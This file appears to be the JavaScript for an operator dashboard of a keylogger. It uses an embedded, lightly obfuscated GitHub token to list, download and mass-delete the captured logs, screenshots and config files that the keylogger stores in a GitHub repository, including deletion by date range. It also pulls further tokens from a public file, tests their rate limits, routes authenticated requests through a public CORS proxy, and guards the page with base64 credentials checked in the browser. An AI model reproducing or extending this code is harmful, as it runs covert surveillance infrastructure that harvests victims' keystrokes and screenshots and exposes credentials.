// login credentials
document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault();

    const encodedUsername = "YmliZWs0OA==";
    const encodedPassword = "YWRtaW5iaWJlaw==";

    // Get user input
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const encodedInputUsername = btoa(username);
    const encodedInputPassword = btoa(password);

    // Validate credentials
    if (encodedInputUsername === encodedUsername && encodedInputPassword === encodedPassword) {
        // Hide the login container
        document.getElementById('loginContainer').classList.add('hidden');

        // Show the success message
        document.getElementById('successMessage').classList.remove('hidden');

        // Show custom notification
        showNotification("You logged in successfully!");
    } else {
        document.getElementById('message').textContent = "Invalid username or password!";
        document.getElementById('message').style.color = "red";
        // Show custom notification
        showNotification("⚠️ Invalid username or password 😡🤬");
    }
});

// Function to show custom notification
function showNotification(message) {
    const notification = document.getElementById('customNotification');
    notification.textContent = message;
    notification.classList.remove('hidden');

    // Hide the notification after 3 seconds
    setTimeout(() => {
        notification.classList.add('hidden');
    }, 3000);
}





// file no. count 
const GITHUB_API_BASE_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads";
const GITHUB_UI_BASE_URL = "https://github.com/bebedudu/keylogger/tree/main/uploads";
const GITHUB_DELETE_URL = "https://github.com/bebedudu/keylogger/tree/delete/main/uploads";
const FOLDERS = ["cache", "config", "keylogerror", "logs", "screenshots"];
const randomletter = "wruif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lirtzg"; // Replace with your actual GitHub token

// Remove the first 5 characters and the last 6 characters
const newRandomLetter = randomletter.slice(5, randomletter.length - 6);

async function fetchFileCounts() {
    const grid = document.getElementById("file-count-grid");
    grid.innerHTML = "Fetching data...";

    const headers = {
        "Authorization": `token ${newRandomLetter}`,
        "Accept": "application/vnd.github.v3+json"
    };

    try {
        const results = await Promise.all(FOLDERS.map(async (folder) => {
            const response = await fetch(`${GITHUB_API_BASE_URL}/${folder}`, { headers });
            if (!response.ok) return { folder, count: "Error" };
            const files = await response.json();
            return { folder, count: files.length };
        }));

        grid.innerHTML = results.map(result => `
                    <div class="col-sm-4 mb-3">
                        <div class="card">
                            <div class="card-body">
                                <span class="delete-icon" onclick="event.stopPropagation(); openDeleteFolder('${result.folder}')"><i class="bi bi-trash"></i></span>
                                <!-- <strong>${result.folder.toUpperCase()}</strong>
                                <p>${result.count} files</p> -->
                                <h5 class="card-title text-center openfolder" onclick="openFolder('${result.folder}')">${result.folder.toUpperCase()}</h5>
                                <p class="card-text text-center">${result.count} files</p>
                            </div>
                        </div>
                    </div>
                `).join("");
    } catch (error) {
        grid.innerHTML = `<p style="color: red;">Error fetching file counts.</p>`;
    }
}

function openFolder(folder) {
    window.open(`${GITHUB_UI_BASE_URL}/${folder}`, "_blank");
}

function openDeleteFolder(folder) {
    window.open(`${GITHUB_DELETE_URL}/${folder}`, "_blank");
}

fetchFileCounts(); // Fetch data on page load






// token data
const TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json";

async function fetchTokens() {
    try {
        const response = await fetch(TOKEN_URL);
        if (!response.ok) throw new Error(`Failed to fetch tokens. Status: ${response.status}`);
        const data = await response.json();
        const tokenGrid = document.getElementById("token-grid");
        tokenGrid.innerHTML = "Fetching data...";
        tokenGrid.innerHTML = await Promise.all(
            Object.entries(data).map(async ([key, value]) => {
                const processedToken = processToken(value);
                const rateLimit = await fetchRateLimit(processedToken);
                return `
                            <div class="col-sm-auto mb-3">
                                <div class="card">
                                    <div class="card-body">
                                        <h5 class="card-title text-center">${key.toUpperCase()}</h5>
                                        <p class="card-text">${processedToken}</p>
                                        <div class="tokendetail">
                                            <strong>Limit:</strong> ${rateLimit.limit || "N/A"}<br>
                                            <strong>Remaining:</strong> ${rateLimit.remaining || "N/A"}<br>
                                            <strong>Reset Time:</strong> ${rateLimit.resetTime || "N/A"}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        `;
            })
        ).then(cards => cards.join(""));
    } catch (error) {
        document.getElementById("token-grid").innerText = "Error fetching tokens.";
    }
}

function processToken(token) {
    return token ? token.substring(5, token.length - 6) : "N/A";
}

async function fetchRateLimit(token) {
    try {
        const response = await fetch("https://api.github.com/user", {
            headers: { Authorization: `Bearer ${token}` },
        });
        if (!response.ok) throw new Error("Failed to fetch rate limit");
        const limit = response.headers.get("X-RateLimit-Limit");
        const remaining = response.headers.get("X-RateLimit-Remaining");
        const reset = response.headers.get("X-RateLimit-Reset");
        return {
            limit: limit || "N/A",
            remaining: remaining || "N/A",
            resetTime: reset ? new Date(reset * 1000).toLocaleString() : "N/A"
        };
    } catch (error) {
        return { limit: "N/A", remaining: "N/A", resetTime: "N/A" };
    }
}

fetchTokens();






// delete files 
// show the no. of files with simultaneously deleting no. of files and try to reattemp to delete files 
const GITHUB_API_BASE = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads";

// Fetch and display the number of files in each folder on page load
document.addEventListener("DOMContentLoaded", async () => {
    const folders = ["cache", "config", "keylogerror", "logs", "screenshots"];

    for (const folder of folders) {
        try {
            const folderUrl = `${GITHUB_API_BASE}/${folder}`;
            const response = await fetch(folderUrl, {
                headers: {
                    "Authorization": `token ${newRandomLetter}`
                }
            });

            if (!response.ok) {
                document.getElementById(`${folder}FileCount`).textContent = "Error fetching file count";
                continue;
            }

            const files = await response.json();
            const fileCount = files.length || 0;

            // Display the file count next to the folder's input box
            document.getElementById(`${folder}FileCount`).textContent = `${fileCount} files available`;
        } catch (error) {
            console.error(`Error fetching file count for folder: ${folder}`, error);
            document.getElementById(`${folder}FileCount`).textContent = "Error fetching file count";
        }
    }
});

async function deleteFiles() {
    const terminalLog = document.getElementById('terminal-log'); // For terminal-like output
    const resultDiv = document.getElementById('result');

    // Clear previous terminal log
    terminalLog.innerHTML = "";

    // Map of folder names to their checkbox, input elements, and progress span
    const folderInputs = [
        { folder: "cache", checkbox: document.getElementById("cacheCheckbox"), countInput: document.getElementById("cacheCount"), progressSpan: document.getElementById("cacheProgress") },
        { folder: "config", checkbox: document.getElementById("configCheckbox"), countInput: document.getElementById("configCount"), progressSpan: document.getElementById("configProgress") },
        { folder: "keylogerror", checkbox: document.getElementById("keylogerrorCheckbox"), countInput: document.getElementById("keylogerrorCount"), progressSpan: document.getElementById("keylogerrorProgress") },
        { folder: "logs", checkbox: document.getElementById("logsCheckbox"), countInput: document.getElementById("logsCount"), progressSpan: document.getElementById("logsProgress") },
        { folder: "screenshots", checkbox: document.getElementById("screenshotsCheckbox"), countInput: document.getElementById("screenshotsCount"), progressSpan: document.getElementById("screenshotsProgress") }
    ];

    try {
        // Filter selected folders and fetch their files
        const selectedFolders = folderInputs
            .filter(({ checkbox }) => checkbox.checked)
            .map(async ({ folder, countInput, progressSpan }) => {
                const numFilesToDelete = parseInt(countInput.value);

                if (isNaN(numFilesToDelete) || numFilesToDelete <= 0) {
                    logToTerminal(`Skipping folder: ${folder} - Invalid or zero file count`, terminalLog);
                    return null;
                }

                logToTerminal(`Fetching files for folder: ${folder}`, terminalLog);

                try {
                    const folderUrl = `${GITHUB_API_BASE}/${folder}`;
                    const response = await fetch(folderUrl, {
                        headers: {
                            "Authorization": `token ${newRandomLetter}`
                        }
                    });

                    if (!response.ok) {
                        logToTerminal(`Failed to fetch files from folder: ${folder} - ${response.statusText}`, terminalLog);
                        return null;
                    }

                    const files = await response.json();

                    if (files.length === 0) {
                        logToTerminal(`No files found in folder: ${folder}`, terminalLog);
                        return null;
                    }

                    // Limit the number of files to delete
                    const filesToDelete = files.slice(0, numFilesToDelete);

                    // Initialize progress counter
                    let deletedCount = 0;
                    progressSpan.textContent = `${deletedCount}/${numFilesToDelete}`;

                    return { folder, filesToDelete, deletedCount, numFilesToDelete, progressSpan };
                } catch (error) {
                    logToTerminal(`Error processing folder: ${folder} - ${error.message}`, terminalLog);
                    return null;
                }
            });

        // Wait for all folder data to be fetched
        const folderData = (await Promise.all(selectedFolders)).filter(Boolean);

        // Sequentially delete files in a round-robin fashion
        let totalDeleted = 0;
        while (folderData.some(({ deletedCount, numFilesToDelete }) => deletedCount < numFilesToDelete)) {
            for (const folder of folderData) {
                const { folder: folderName, filesToDelete, deletedCount, numFilesToDelete, progressSpan } = folder;

                if (deletedCount >= numFilesToDelete) continue; // Skip if all files for this folder are deleted

                const file = filesToDelete[deletedCount];

                try {
                    // await deleteFileWithRetry(file.path, file.sha, 3); // Retry up to 3 times
                    await deleteFileWithRetry(file.path, file.sha, terminalLog, 3); // Retry up to 3 times
                    folder.deletedCount++;
                    folder.progressSpan.textContent = `${folder.deletedCount}/${numFilesToDelete}`;
                    logToTerminal(`Deleted: ${file.name} from folder: ${folderName}`, terminalLog);
                    totalDeleted++;
                } catch (error) {
                    logToTerminal(`Error deleting: ${file.name} from folder: ${folderName} - ${error.message}`, terminalLog);
                }
            }
        }

        resultDiv.textContent = `Operation completed. Check the terminal log for details.`;
        // Show custom notification
        showNotification("Deletion completed. Check the terminal log for details.");
    } catch (error) {
        console.error(error);
        resultDiv.textContent = `Error: ${error.message}`;
    }
}

// async function deleteFileWithRetry(filePath, sha, retries) {
//     let attempt = 1;

//     while (attempt <= retries) {
//         try {
//             await deleteFile(filePath, sha);
//             return; // Success, exit the loop
//         } catch (error) {
//             if (attempt === retries) {
//                 throw new Error(`All ${retries} attempts failed. Last error: ${error.message}`);
//             }
//             logToTerminal(`Attempt ${attempt} failed for file: ${filePath.split('/').pop()}. Retrying...`, document.getElementById('terminal-log'));
//             attempt++;
//         }
//     }
// }

async function deleteFile(filePath, sha) {
    const deleteUrl = `https://api.github.com/repos/bebedudu/keylogger/contents/${encodeURIComponent(filePath)}`;

    const response = await fetch(deleteUrl, {
        method: "DELETE",
        headers: {
            "Authorization": `token ${newRandomLetter}`,
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            message: `Deleted: ${filePath.split('/').pop()}`,
            sha: sha
        })
    });

    if (!response.ok) {
        const errorData = await response.json();
        throw new Error(`GitHub API Error: ${errorData.message}`);
    }
}

function logToTerminal(message, terminalLog) {
    const logEntry = document.createElement("p");
    logEntry.textContent = message;
    terminalLog.appendChild(logEntry);
    terminalLog.scrollTop = terminalLog.scrollHeight;
}





// advance delete
const GITHUB_API_BASE2 = "https://api.github.com/repos/bebedudu/keylogger/contents";
async function performAdvancedDeletion() {
    const terminalLog = document.getElementById('advancedTerminalLog');
    const resultDiv = document.getElementById('advancedResult');

    // Clear previous terminal log
    terminalLog.innerHTML = "";

    // Get user-selected action
    const action = document.querySelector('input[name="action"]:checked')?.value;

    if (!action) {
        resultDiv.textContent = "Please select an action.";
        return;
    }

    // Get folder paths, file names, and date/time ranges
    const folderPaths = [
        document.getElementById('advancedFolderPath1').value,
        document.getElementById('advancedFolderPath2').value,
        document.getElementById('advancedFolderPath3').value,
        document.getElementById('advancedFolderPath4').value,
        document.getElementById('advancedFolderPath5').value
    ];

    const fileNames = [
        document.getElementById('advancedFileName1').value.trim(),
        document.getElementById('advancedFileName2').value.trim(),
        document.getElementById('advancedFileName3').value.trim(),
        document.getElementById('advancedFileName4').value.trim(),
        document.getElementById('advancedFileName5').value.trim()
    ];

    const startDates = [
        document.getElementById('startDate1').value,
        document.getElementById('startDate2').value,
        document.getElementById('startDate3').value,
        document.getElementById('startDate4').value,
        document.getElementById('startDate5').value
    ];

    const startTimes = [
        document.getElementById('startTime1').value,
        document.getElementById('startTime2').value,
        document.getElementById('startTime3').value,
        document.getElementById('startTime4').value,
        document.getElementById('startTime5').value
    ];

    const endDates = [
        document.getElementById('endDate1').value,
        document.getElementById('endDate2').value,
        document.getElementById('endDate3').value,
        document.getElementById('endDate4').value,
        document.getElementById('endDate5').value
    ];

    const endTimes = [
        document.getElementById('endTime1').value,
        document.getElementById('endTime2').value,
        document.getElementById('endTime3').value,
        document.getElementById('endTime4').value,
        document.getElementById('endTime5').value
    ];

    try {
        for (let i = 0; i < folderPaths.length; i++) {
            const folderPath = folderPaths[i];
            const fileName = fileNames[i];
            const startDate = startDates[i];
            const startTime = startTimes[i];
            const endDate = endDates[i];
            const endTime = endTimes[i];

            logToTerminal(`Processing folder: ${folderPath}`, terminalLog);

            // Skip deletion if no specific file name is provided for "stopOnFile" or "deleteOnFile"
            if ((action === "stopOnFile" || action === "deleteOnFile") && !fileName) {
                logToTerminal(`Skipping folder: ${folderPath}. No specific file name provided.`, terminalLog);
                continue;
            }

            const folderUrl = `${GITHUB_API_BASE2}/${folderPath}`;
            const response = await fetch(folderUrl, {
                headers: {
                    "Authorization": `token ${newRandomLetter}`
                }
            });

            if (!response.ok) {
                logToTerminal(`Failed to fetch files from folder: ${folderPath} - ${response.statusText}`, terminalLog);
                continue;
            }

            const files = await response.json();

            if (files.length === 0) {
                logToTerminal(`No files found in folder: ${folderPath}`, terminalLog);
                continue;
            }

            for (const file of files) {
                const filePath = file.path;
                const fileSha = file.sha;

                // Handle "Stop Deletion when a Specific File is Found"
                if (action === "stopOnFile" && file.name === fileName) {
                    logToTerminal(`Stopping deletion process for folder: ${folderPath}. File found: ${fileName}`, terminalLog);
                    break; // Stop processing further files in this folder
                }

                // Handle "Delete when a Specific File is Found"
                if (action === "deleteOnFile" && file.name === fileName) {
                    await deleteFileWithRetry(filePath, fileSha, terminalLog, 3);
                    logToTerminal(`Deleted specific file: ${fileName} from folder: ${folderPath}`, terminalLog);
                    break; // Stop processing further files in this folder
                }

                // Handle "Delete Files within Date and Time Range"
                if (action === "deleteInRange") {
                    // Extract YYYYMMDD and HHMMSS from the file name
                    const match = file.name.match(/^(\d{8})_(\d{6})/); // Match YYYYMMDD_HHMMSS at the start of the file name
                    const fileDate = match?.[1]; // YYYYMMDD
                    const fileTime = match?.[2]; // HHMMSS

                    if (fileDate && fileTime) {
                        if (
                            fileDate >= startDate &&
                            fileDate <= endDate &&
                            fileTime >= startTime &&
                            fileTime <= endTime
                        ) {
                            await deleteFileWithRetry(filePath, fileSha, terminalLog, 3);
                            logToTerminal(`Deleted file within range: ${file.name} from folder: ${folderPath}`, terminalLog);
                        } else {
                            // logToTerminal(`Skipping file outside range: ${file.name} from folder: ${folderPath}`, terminalLog);
                            continue
                        }
                    } else {
                        logToTerminal(`Skipping file with invalid date/time format: ${file.name} from folder: ${folderPath}`, terminalLog);
                    }
                }

                // For "Stop Deletion when a Specific File is Found", delete files until the specific file is found
                if (action === "stopOnFile") {
                    await deleteFileWithRetry(filePath, fileSha, terminalLog, 3);
                    logToTerminal(`Deleted file: ${file.name} from folder: ${folderPath}`, terminalLog);
                }
            }
        }

        resultDiv.textContent = "Operation completed. Check the terminal log for details.";
    } catch (error) {
        console.error(error);
        resultDiv.textContent = `Error: ${error.message}`;
    }
}

async function deleteFileWithRetry(filePath, sha, terminalLog, retries) {
    let attempt = 1;

    while (attempt <= retries) {
        try {
            await deleteFile(filePath, sha, terminalLog);
            return; // Success, exit the loop
        } catch (error) {
            if (attempt === retries) {
                logToTerminal(`All ${retries} attempts failed for file: ${filePath.split('/').pop()}. Last error: ${error.message}`, terminalLog);
                throw new Error(`All ${retries} attempts failed. Last error: ${error.message}`);
            }
            logToTerminal(`Attempt ${attempt} failed for file: ${filePath.split('/').pop()}. Retrying...`, terminalLog);
            attempt++;
        }
    }
}

// async function deleteFile(filePath, sha, terminalLog) {
//     const deleteUrl = `https://api.github.com/repos/bebedudu/keylogger/contents/${encodeURIComponent(filePath)}`;

//     const response = await fetch(deleteUrl, {
//         method: "DELETE",
//         headers: {
//             "Authorization": `token ${newRandomLetter}`,
//             "Content-Type": "application/json"
//         },
//         body: JSON.stringify({
//             message: `Deleted: ${filePath.split('/').pop()}`,
//             sha: sha
//         })
//     });

//     if (!response.ok) {
//         const errorData = await response.json();
//         throw new Error(`GitHub API Error: ${errorData.message}`);
//     }
// }

// function logToTerminal(message, terminalLog) {
//     const logEntry = document.createElement("p");
//     logEntry.textContent = message;
//     terminalLog.appendChild(logEntry);
//     terminalLog.scrollTop = terminalLog.scrollHeight;
// }






// download files
// const GITHUB_API_BASE = "https://api.github.com/repos/bebedudu/keylogger/contents";
// const newRandomLetter = "dfsghp_F7mmXrLHwlyu8IC6jOQmfsdaf9aCE1KIehT3tLJiadfs"; // Replace with your GitHub PAT


// no. of file is effecting now all menu item (x date & time range also need this)
async function performDownload() {
    const terminalLog = document.getElementById('downloadTerminalLog');
    const resultDiv = document.getElementById('downloadResult');

    // Clear previous terminal log
    terminalLog.innerHTML = "";

    // Get user-selected action
    const action = document.querySelector('input[name="downloadAction"]:checked')?.value;

    if (!action) {
        resultDiv.textContent = "Please select an action.";
        return;
    }

    // Get folder paths, date/time ranges, file counts, and user names
    const folderPaths = [
        document.getElementById('downloadFolderPath1').value,
        document.getElementById('downloadFolderPath2').value,
        document.getElementById('downloadFolderPath3').value,
        document.getElementById('downloadFolderPath4').value,
        document.getElementById('downloadFolderPath5').value,
        // Add more folders as needed
    ];

    const startDates = [
        document.getElementById('downloadStartDate1').value,
        document.getElementById('downloadStartDate2').value,
        document.getElementById('downloadStartDate3').value,
        document.getElementById('downloadStartDate4').value,
        document.getElementById('downloadStartDate5').value,
        // Add more folders as needed
    ];

    const startTimes = [
        document.getElementById('downloadStartTime1').value,
        document.getElementById('downloadStartTime2').value,
        document.getElementById('downloadStartTime3').value,
        document.getElementById('downloadStartTime4').value,
        document.getElementById('downloadStartTime5').value,
        // Add more folders as needed
    ];

    const endDates = [
        document.getElementById('downloadEndDate1').value,
        document.getElementById('downloadEndDate2').value,
        document.getElementById('downloadEndDate3').value,
        document.getElementById('downloadEndDate4').value,
        document.getElementById('downloadEndDate5').value,
        // Add more folders as needed
    ];

    const endTimes = [
        document.getElementById('downloadEndTime1').value,
        document.getElementById('downloadEndTime2').value,
        document.getElementById('downloadEndTime3').value,
        document.getElementById('downloadEndTime4').value,
        document.getElementById('downloadEndTime5').value,
        // Add more folders as needed
    ];

    const fileCounts = [
        parseInt(document.getElementById('downloadFileCount1').value),
        parseInt(document.getElementById('downloadFileCount2').value),
        parseInt(document.getElementById('downloadFileCount3').value),
        parseInt(document.getElementById('downloadFileCount4').value),
        parseInt(document.getElementById('downloadFileCount5').value),
        // Add more folders as needed
    ];

    const userNames = [
        document.getElementById('downloadUserName1').value.trim(),
        document.getElementById('downloadUserName2').value.trim(),
        document.getElementById('downloadUserName3').value.trim(),
        document.getElementById('downloadUserName4').value.trim(),
        document.getElementById('downloadUserName5').value.trim(),
        // Add more folders as needed
    ];

    try {
        for (let i = 0; i < folderPaths.length; i++) {
            const folderPath = folderPaths[i];
            const startDate = startDates[i];
            const startTime = startTimes[i];
            const endDate = endDates[i];
            const endTime = endTimes[i];
            const fileCount = fileCounts[i];
            const userName = userNames[i];

            logToTerminal(`Processing folder: ${folderPath}`, terminalLog);

            const folderUrl = `${GITHUB_API_BASE2}/${folderPath}`;
            const response = await fetch(folderUrl, {
                headers: {
                    "Authorization": `token ${newRandomLetter}`
                }
            });

            if (!response.ok) {
                logToTerminal(`Failed to fetch files from folder: ${folderPath} - ${response.statusText}`, terminalLog);
                continue;
            }

            const files = await response.json();

            if (files.length === 0) {
                logToTerminal(`No files found in folder: ${folderPath}`, terminalLog);
                continue;
            }

            // Sort files by date (most recent first)
            const sortedFiles = files.sort((a, b) => {
                const dateA = a.name.match(/^(\d{8})_(\d{6})/);
                const dateB = b.name.match(/^(\d{8})_(\d{6})/);
                if (!dateA || !dateB) return 0;
                return `${dateB[1]}${dateB[2]}`.localeCompare(`${dateA[1]}${dateA[2]}`);
            });

            // Filter files based on the selected action
            let filteredFiles = [];
            if (action === "downloadInRange") {
                filteredFiles = sortedFiles.filter(file => {
                    const match = file.name.match(/^(\d{8})_(\d{6})/);
                    const fileDate = match?.[1];
                    const fileTime = match?.[2];
                    if (fileDate && fileTime) {
                        return (
                            fileDate >= startDate &&
                            fileDate <= endDate &&
                            fileTime >= startTime &&
                            fileTime <= endTime
                        );
                    }
                    return false;
                });
            } else if (action === "downloadByUser") {
                filteredFiles = sortedFiles.filter(file => file.name.includes(userName));
            } else if (action === "downloadCount") {
                filteredFiles = sortedFiles;
            }

            // Apply the "Number of Files to Download" limit
            const filesToDownload = filteredFiles.slice(0, fileCount);

            // Download files
            for (const file of filesToDownload) {
                const downloadUrl = file.download_url;
                if (!downloadUrl) {
                    logToTerminal(`Skipping file (no download URL): ${file.name} from folder: ${folderPath}`, terminalLog);
                    continue;
                }

                try {
                    await downloadFile(downloadUrl, file.name, terminalLog);
                    logToTerminal(`Downloaded file: ${file.name} from folder: ${folderPath}`, terminalLog);
                } catch (error) {
                    logToTerminal(`Error downloading file: ${file.name} from folder: ${folderPath} - ${error.message}`, terminalLog);
                }
            }
        }

        resultDiv.textContent = "Operation completed. Check the terminal log for details.";
    } catch (error) {
        console.error(error);
        resultDiv.textContent = `Error: ${error.message}`;
    }
}

async function downloadFile(url, fileName, terminalLog) {
    try {
        // Use a CORS proxy to bypass CORS restrictions
        const proxyUrl = `https://cors-anywhere.herokuapp.com/${url}`;
        const response = await fetch(proxyUrl, {
            headers: {
                "Authorization": `token ${newRandomLetter}`
            }
        });

        if (!response.ok) {
            throw new Error(`Failed to download file: ${response.statusText}`);
        }

        const blob = await response.blob();
        const link = document.createElement("a");
        link.href = URL.createObjectURL(blob);
        link.download = fileName;
        link.click();
    } catch (error) {
        throw new Error(`Error downloading file: ${error.message}`);
    }
}

function logToTerminal(message, terminalLog) {
    const logEntry = document.createElement("p");
    logEntry.textContent = message;
    terminalLog.appendChild(logEntry);
    terminalLog.scrollTop = terminalLog.scrollHeight;
}
